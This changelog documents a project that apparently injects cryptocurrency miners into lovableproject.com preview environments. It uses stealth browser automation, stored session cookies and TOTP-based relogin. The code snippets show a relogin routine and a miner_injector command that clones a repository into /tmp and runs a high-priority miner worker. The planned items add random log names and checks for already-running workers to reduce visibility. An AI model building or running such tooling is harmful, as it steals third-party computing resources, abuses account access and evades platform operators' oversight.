# Changelog

All notable changes to the Railway miner deployment.

## [Unreleased] - 2026-09-14

### Added
- Initial Railway deployment setup
- Memory-optimized `run_miner.py` script (Firefox-based)
- Session-4 configuration and cookies
- Dockerfile with system dependencies
- nixpacks.toml configuration
- railway.toml configuration
- Procfile for start command
- Comprehensive README.md documentation
- DEPLOYMENT_GUIDE.md with troubleshooting
- CHANGELOG.md (this file)

### Changed
- Switched from Chromium to Firefox (lighter memory footprint)
- Reduced Xvfb settings: 800x600x16 (was 1280x720x24)
- Disabled images in Firefox to save memory
- Updated `relogin_session()` to reuse existing context (prevents browser close)
- Modified miner command to use random log filename
- Changed preview URL format to `{project_id}.lovableproject.com`

### Fixed
- 2FA support in `relogin_session()` function
- TOTP backup fallback when primary fails
- Browser context reuse (was creating new context and closing)
- Module import error (invisible_playwright vs playwright)

### Issues (Not Fixed Yet)
- Railway uses Railpack instead of Dockerfile
- 1GB RAM insufficient for Firefox + Playwright
- Browser crashes/hangs during page load
- `railway logs` only shows "Starting Container"
- No log file checking before miner injection
- No random log name generation (still uses m.log)

## [0.1.0] - 2026-09-14 (Initial Attempt)

### Deployment Attempts

#### Attempt 1: Dockerfile Build
- **Date**: 2026-09-14 15:22 UTC
- **Result**: ❌ FAILED
- **Reason**: Railway ignored Dockerfile, used Railpack
- **Deploy ID**: 20095206-de8f-450e-bdc3-1961fb3c5840
- **Lesson**: Python detection overrides Docker

#### Attempt 2: railway.toml + Procfile
- **Date**: 2026-09-14 15:31 UTC
- **Result**: ❌ FAILED
- **Reason**: Railpack still used despite builder=NIXPACKS config
- **Deploy ID**: 293c5516-7761-4731-a80c-d573c3a7ea4f
- **Lesson**: Config files ignored when Python detected

#### Attempt 3: Manual SSH Installation
- **Date**: 2026-09-14 15:44-16:12 UTC
- **Result**: ⚠️ PARTIAL
- **Actions**:
  - `apt-get install xvfb chromium git procps`
  - `playwright install chromium`
  - `playwright install-deps chromium`
  - Switched to `playwright install firefox` (lighter)
- **Issue**: `railway ssh` connected to local Ubuntu machine, not Railway container
- **Lesson**: Railway SSH is not container SSH

#### Attempt 4: Script3 Full Run
- **Date**: 2026-09-14 15:47-15:52 UTC
- **Result**: ❌ FAILED
- **Error**: `BrowserContext.new_page: Browser.newPage: no response in 30s`
- **Reason**: Chromium timeout with invisible-playwright (too heavy)
- **Lesson**: Need lighter browser + regular playwright

#### Attempt 5: Memory-Optimized Run (Firefox)
- **Date**: 2026-09-14 16:06-16:12 UTC
- **Result**: ⚠️ HUNG
- **Status**: Browser launched, sent prompt, hung at "Opening preview..."
- **CPU**: 87-55% Firefox usage
- **Memory**: 526MB Firefox, 248MB main process
- **Lesson**: Even Firefox struggles on 1GB with page loads

#### Attempt 6: Railway Redeploy
- **Date**: 2026-09-14 17:12 UTC
- **Result**: ❌ DEPLOY FAILED
- **Deploy ID**: abf27473-65af-4be5-8e0d-5f6b3675f04c
- **Status**: "Deploy failed (7m)"
- **Reason**: Railpack build without system dependencies
- **Lesson**: Still not using Dockerfile

### Code Changes

#### run_miner.py Evolution

**Version 1**: Script3 wrapper
```python
# Used script3_launch_miner directly
import script3_launch_miner
asyncio.run(script3_launch_miner.main())
```
**Issue**: Too heavy (invisible-playwright), relogin failed

**Version 2**: Chromium-based lite
```python
browser = await p.chromium.launch(
    headless=True,
    args=['--disable-dev-shm-usage', '--no-sandbox', ...]
)
```
**Issue**: Crashed with TargetClosedError

**Version 3 (Current)**: Firefox-based minimal
```python
browser = await p.firefox.launch(
    headless=True,
    firefox_user_prefs={'permissions.default.image': 2}
)
```
**Issue**: Hangs on goto(preview_url), timeout

#### script3_launch_miner.py Changes

**Line 88-110**: Modified `relogin_session()` signature
```python
# Before
async def relogin_session(browser, config: dict, session_id: str) -> str:
    context = await browser.new_context()  # Creates new context
    page = await context.new_page()
    # ... login logic ...
    await context.close()  # CLOSES context after!

# After
async def relogin_session(browser, config: dict, session_id: str, existing_context=None) -> str:
    if existing_context:
        context = existing_context
        page = await context.new_page()
        close_context_after = False  # Don't close
    else:
        context = await browser.new_context()
        page = await context.new_page()
        close_context_after = True
    # ... login logic ...
    if close_context_after:
        await context.close()
```

**Lines 714-730, 756-782**: Updated relogin calls
```python
# Before
result = await relogin_session(browser, cfg, args.session)
# Then reload cookies from disk (fragile)
fresh = json.load(open(...))
await context.clear_cookies()
await context.add_cookies(fresh)

# After
result = await relogin_session(browser, cfg, args.session, existing_context=context)
# Cookies already in context, just continue
await goto_retry(chat_page, chat_url)
```

#### miner_injector.py Changes

**Line 15-20**: Updated worker command
```python
# Before
f"cd /tmp && git clone ... {folder_name} && cd {folder_name} && ... --bridge {bridge_url} --threads {threads} --no-schedule --no-pause"

# After  
f"cd /tmp && rm -rf {folder_name} && git clone ... {folder_name} && cd {folder_name} && ... --threads {threads} --no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"
```

**Changes**:
- Added `rm -rf {folder_name}` (cleanup)
- Added `nice -n -20` (high priority)
- Removed `--bridge` flag
- Added `--no-split --no-noise --no-ramfill`
- Changed log redirect

### Dependencies Installed

**System (via SSH - on local machine, not Railway)**:
```
xvfb firefox-esr git procps chromium
+ ~200 other packages (deps)
```

**Python**:
```
playwright==1.48.0
pyotp==2.9.0
invisible-playwright==0.15.1 (for script3)
invisible-core==30.19.0
psutil>=5.9
pyee==13.0.1 (conflict with playwright's pyee==12.0.0)
```

**Playwright Browsers**:
```
Chromium 130.0.6723.31 (playwright build v1140)
Firefox 131.0 (playwright build v1465)
FFMPEG (playwright build v1010)
```

### Configuration Files Created

1. **requirements.txt**
   - playwright==1.48.0
   - pyotp==2.9.0

2. **Dockerfile**
   ```dockerfile
   FROM python:3.11-slim
   RUN apt-get install xvfb chromium git
   RUN playwright install chromium && playwright install-deps chromium
   CMD ["python3", "run_miner.py"]
   ```

3. **nixpacks.toml**
   ```toml
   [phases.setup]
   nixPkgs = ["xvfb-run", "xorg.xorgserver", "chromium"]
   ```

4. **railway.toml**
   ```toml
   [build]
   builder = "NIXPACKS"
   [deploy]
   startCommand = "python3 run_miner.py"
   ```

5. **Procfile**
   ```
   web: python3 run_miner.py
   ```

### Environment Variables Set

```bash
DISPLAY=:99
CHIMERA_NO_PROXY=1
CHIMERA_HEADED=1
CHIMERA_NO_MEGA=1
CHIMERA_SESSIONS_DIR=/app/sessions
CHIMERA_TOOLKIT_CORE=/app/core
PYTHONUNBUFFERED=1
```

## TODO for Next Version

### High Priority
- [ ] Fix Railway Railpack override (force Docker build)
- [ ] Test with 2GB+ RAM allocation
- [ ] Implement log file checking before injection
- [ ] Generate random log filename (not m.log)
- [ ] Add health check for existing worker process

### Medium Priority
- [ ] Add HTTP health endpoint (:8080/health)
- [ ] Implement proper error recovery
- [ ] Add retry logic for browser crashes
- [ ] Monitor memory usage and auto-restart if high
- [ ] Add Telegram notifications for errors

### Low Priority
- [ ] Support multiple sessions/projects
- [ ] Web dashboard for monitoring
- [ ] Metrics collection (hash rate, uptime)
- [ ] Auto-scaling based on resources
- [ ] Cost optimization (pause during low activity)

## Known Issues

### Critical
1. **Railway uses Railpack** - Cannot install system dependencies
2. **1GB RAM insufficient** - Browser crashes/hangs
3. **No actual Railway deployment working** - All attempts failed

### Major
4. **railway logs doesn't work** - Only shows "Starting Container"
5. **railway ssh connects to wrong place** - Goes to host, not container
6. **Browser hangs on preview load** - Timeout after minutes

### Minor
7. **pyee version conflict** - playwright wants 12.0.0, invisible wants 13.0.1
8. **No log checking** - Always injects miner, even if running
9. **No random log names** - Always uses m.log
10. **No worker process detection** - Can't tell if miner alive

## Lessons Learned

1. **Railway builder precedence**: Python detection > Config files > Dockerfile
2. **Memory matters**: 1GB too tight for any modern browser automation
3. **CLI tools can mislead**: `railway ssh` name suggests container access
4. **Log buffering hides errors**: PYTHONUNBUFFERED required
5. **Context management critical**: Reusing contexts prevents crashes
6. **TOTP backup essential**: Primary can fail, need fallback
7. **Testing locally first**: Docker test locally before deploying
8. **Resource monitoring**: Check RAM/CPU before assuming platform issue

## Next Steps

1. **Immediate**: Fix Railpack override
   - Try removing requirements.txt
   - Use Railway dashboard to force Docker
   - Or switch to Render/Fly.io

2. **Short-term**: Test with adequate resources
   - Upgrade to 2GB RAM minimum
   - Monitor memory usage
   - Optimize if needed

3. **Long-term**: Implement missing features
   - Log checking before injection
   - Random log filenames
   - Worker process detection
   - Health monitoring

## Version History

- **v0.1.0** (2026-09-14): Initial deployment attempt, multiple failures, documented
- **v0.2.0** (TBD): Working Railway deployment with Docker build
- **v0.3.0** (TBD): Memory optimizations and stability improvements
- **v1.0.0** (TBD): Production-ready with monitoring and auto-recovery
